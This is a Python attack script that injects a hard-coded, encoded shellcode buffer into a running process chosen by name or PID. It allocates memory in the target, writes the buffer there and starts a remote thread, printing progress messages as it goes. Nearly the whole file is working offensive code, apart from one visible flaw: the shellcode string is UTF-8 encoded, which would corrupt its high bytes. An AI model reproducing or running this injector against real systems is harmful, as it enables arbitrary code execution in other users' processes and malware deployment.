from process_injector import ProcessInjector
from argparse import ArgumentParser

if __name__ == "__main__":
    parser = ArgumentParser("Inject shellcode into a running process")
    parser.add_argument(
        "-p", "--pid",
        action="store_true",
        help="PROC will be a PID instead of a process name"
    )
    parser.add_argument("PROC", help="the target process")

    args = parser.parse_args()

    buf =  ""
    buf += "\xd9\xc3\xd9\x74\x24\xf4\x5e\xbd\x7c\xea\x67\x01\x33"
    buf += "\xc9\xb1\x52\x31\x6e\x17\x03\x6e\x17\x83\x92\x16\x85"
    buf += "\xf4\x96\x0f\xc8\xf7\x66\xd0\xad\x7e\x83\xe1\xed\xe5"
    buf += "\xc0\x52\xde\x6e\x84\x5e\x95\x23\x3c\xd4\xdb\xeb\x33"
    buf += "\x5d\x51\xca\x7a\x5e\xca\x2e\x1d\xdc\x11\x63\xfd\xdd"
    buf += "\xd9\x76\xfc\x1a\x07\x7a\xac\xf3\x43\x29\x40\x77\x19"
    buf += "\xf2\xeb\xcb\x8f\x72\x08\x9b\xae\x53\x9f\x97\xe8\x73"
    buf += "\x1e\x7b\x81\x3d\x38\x98\xac\xf4\xb3\x6a\x5a\x07\x15"
    buf += "\xa3\xa3\xa4\x58\x0b\x56\xb4\x9d\xac\x89\xc3\xd7\xce"
    buf += "\x34\xd4\x2c\xac\xe2\x51\xb6\x16\x60\xc1\x12\xa6\xa5"
    buf += "\x94\xd1\xa4\x02\xd2\xbd\xa8\x95\x37\xb6\xd5\x1e\xb6"
    buf += "\x18\x5c\x64\x9d\xbc\x04\x3e\xbc\xe5\xe0\x91\xc1\xf5"
    buf += "\x4a\x4d\x64\x7e\x66\x9a\x15\xdd\xef\x6f\x14\xdd\xef"
    buf += "\xe7\x2f\xae\xdd\xa8\x9b\x38\x6e\x20\x02\xbf\x91\x1b"
    buf += "\xf2\x2f\x6c\xa4\x03\x66\xab\xf0\x53\x10\x1a\x79\x38"
    buf += "\xe0\xa3\xac\xef\xb0\x0b\x1f\x50\x60\xec\xcf\x38\x6a"
    buf += "\xe3\x30\x58\x95\x29\x59\xf3\x6c\xba\xa6\xac\x4f\xba"
    buf += "\x4f\xaf\x8f\x98\x37\x26\x69\xb6\x57\x6f\x22\x2f\xc1"
    buf += "\x2a\xb8\xce\x0e\xe1\xc5\xd1\x85\x06\x3a\x9f\x6d\x62"
    buf += "\x28\x48\x9e\x39\x12\xdf\xa1\x97\x3a\x83\x30\x7c\xba"
    buf += "\xca\x28\x2b\xed\x9b\x9f\x22\x7b\x36\xb9\x9c\x99\xcb"
    buf += "\x5f\xe6\x19\x10\x9c\xe9\xa0\xd5\x98\xcd\xb2\x23\x20"
    buf += "\x4a\xe6\xfb\x77\x04\x50\xba\x21\xe6\x0a\x14\x9d\xa0"
    buf += "\xda\xe1\xed\x72\x9c\xed\x3b\x05\x40\x5f\x92\x50\x7f"
    buf += "\x50\x72\x55\xf8\x8c\xe2\x9a\xd3\x14\x02\x79\xf1\x60"
    buf += "\xab\x24\x90\xc8\xb6\xd6\x4f\x0e\xcf\x54\x65\xef\x34"
    buf += "\x44\x0c\xea\x71\xc2\xfd\x86\xea\xa7\x01\x34\x0a\xe2"
    bbuf = buf.encode("utf-8")

    with ProcessInjector(args.PROC, pid=args.pid) as ps_handle:
        bbuf_len = len(bbuf)
        try:
            base_addr = ps_handle.virtual_alloc_ex(bbuf_len)
            print(f"Base Address @ {base_addr}")
            print("[+] Writing data into allocated memory...")
            ps_handle.write_process_memory(bbuf, bbuf_len)
            print("[+] Creating remote thread...")
            print(ps_handle.create_remote_thread())
            print("[+] Remote process memory injection Successful ...")
        except Exception as err:
            print(err)
